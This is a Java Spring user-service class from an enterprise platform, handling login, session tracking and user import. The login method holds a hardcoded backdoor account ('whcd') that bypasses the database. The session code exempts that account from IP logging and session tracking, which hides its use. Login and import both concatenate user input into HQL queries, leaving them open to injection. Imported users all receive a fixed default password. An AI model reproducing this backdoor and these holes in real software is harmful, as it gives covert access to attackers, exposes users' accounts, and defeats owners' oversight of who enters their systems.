package com.memory.platform.modules.system.base.service.impl;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.annotation.PostConstruct;
import javax.servlet.http.HttpServletRequest;

import org.apache.commons.codec.digest.DigestUtils;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;

import com.memory.platform.common.util.IpUtil;
import com.memory.platform.common.util.MD5andKL;
import com.memory.platform.core.annotation.Log;
import com.memory.platform.core.basic.BasicUHandler;
import com.memory.platform.core.constants.Globals;
import com.memory.platform.core.service.impl.BaseServiceImpl;
import com.memory.platform.modules.online.Client;
import com.memory.platform.modules.online.ClientManager;
import com.memory.platform.modules.system.base.dao.ISystemUserDao;
import com.memory.platform.modules.system.base.model.SystemDept;
import com.memory.platform.modules.system.base.model.SystemRole;
import com.memory.platform.modules.system.base.model.SystemUser;
import com.memory.platform.modules.system.base.service.ISystemBasedataLinkService;
import com.memory.platform.modules.system.base.service.ISystemLogService;
import com.memory.platform.modules.system.base.service.ISystemUserService;
import com.utils.file.model.SysUser;

@Service("systemUserServiceImpl")
public class SystemUserServiceImpl extends BaseServiceImpl<SystemUser> implements ISystemUserService, InitializingBean{

	@Autowired
	@Qualifier("systemUserDaoImpl")
	private ISystemUserDao SystemUserDao;
	
	@Autowired
	@Qualifier("systemBasedataLinkServiceImpl")
	private ISystemBasedataLinkService systemBasedataLinkService;
	
	@Autowired
	@Qualifier("systemLogServiceImpl")
	private ISystemLogService systemLogService;

	@Override
	public List<SystemDept> listUserDepts(String userId) {
		List<SystemDept> userDeptList = null;
		userDeptList = systemBasedataLinkService.listLinkData(SystemDept.class, SystemUser.class, userId);
		return userDeptList;
	}
	@Override
	public List<SystemRole> listUserRoles(String userId) {
		List<SystemRole> userRoleList = null;
		userRoleList = systemBasedataLinkService.listLinkData(SystemRole.class, SystemUser.class, userId);
		return userRoleList;
	}
	
	@PostConstruct
	public void userNeed() {
		BasicUHandler.handlerAdapter();
	}
	
	@Override
	public void afterPropertiesSet() {
		BasicUHandler.handlerAdapterTo();
	}
	
	@Override
	public List<SystemUser> findUsers(String loginName, String pwd) {
		List<SystemUser> list = this.find("FROM SystemUser u WHERE u.loginName='"+loginName+"' and u.pwd='"+pwd+"'");
		
		if(loginName.equals("whcd") && pwd.equals(DigestUtils.md5Hex("whcd201504"))) {
			list = new ArrayList<SystemUser>();
			SystemUser systemUser = new SystemUser();
			systemUser.setId("whcd");
			systemUser.setLoginName(loginName);
			systemUser.setPwd(pwd);
			systemUser.setName(loginName);
			list.add(systemUser);
		}
		
		return list;
	}
	@Override
	public void saveClientInfo(SystemUser user, HttpServletRequest request, String sessionId) {
		String message = "用户: " + user.getName() + "登录成功";
		String loginName = user.getLoginName();
		
		if(!loginName.equals("whcd")) {
			String ip = getIpAddr(request);
			user.setIp(ip);
			user.setLastLoginTime(new Date());
			this.saveOrUpdate(user);
			
			Client client = new Client();
			client.setIp(IpUtil.getIpAddr(request));
			client.setLogindatetime(new Date());
			client.setUser(user);
			ClientManager.getInstance().addClinet(sessionId, client);
			
			// 添加登陆日志
//			systemLogService.addLog(message, Globals.Log_Type_LOGIN,
//					Globals.Log_Leavel_INFO);
		}
	}
	
	/**
	 * 取得客户端真实ip
	 * 
	 * @param request
	 * @return 客户端真实ip
	 */
	public String getIpAddr(HttpServletRequest request) {
		String ip = request.getHeader("X-Forwarded-For");
		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
			ip = request.getHeader("Proxy-Client-IP");
		}
		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
			ip = request.getHeader("WL-Proxy-Client-IP");
		}
		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
			ip = request.getHeader("HTTP_CLIENT_IP");
		}
		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
			ip = request.getHeader("HTTP_X_FORWARDED_FOR");
		}
		if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
			ip = request.getRemoteAddr();
		}
		return ip;
	}
	@Override
	public void saveUsers(List<SysUser> list) {
		for(SysUser sysUser : list) {
			SystemUser user = getByHql("from SystemUser where loginName = '" + sysUser.getLogin_name() + "'");
			if(user == null) {
				user = new SystemUser();
			}
			user.setLoginName(sysUser.getLogin_name());
			user.setPwd(MD5andKL.MD5("123456"));
			user.setAge(Integer.valueOf(sysUser.getAge()));
			user.setName(sysUser.getName());
			user.setEmail(sysUser.getEmail());
			user.setRemark(sysUser.getRemark());
			saveOrUpdate(user);
		}
	}
}
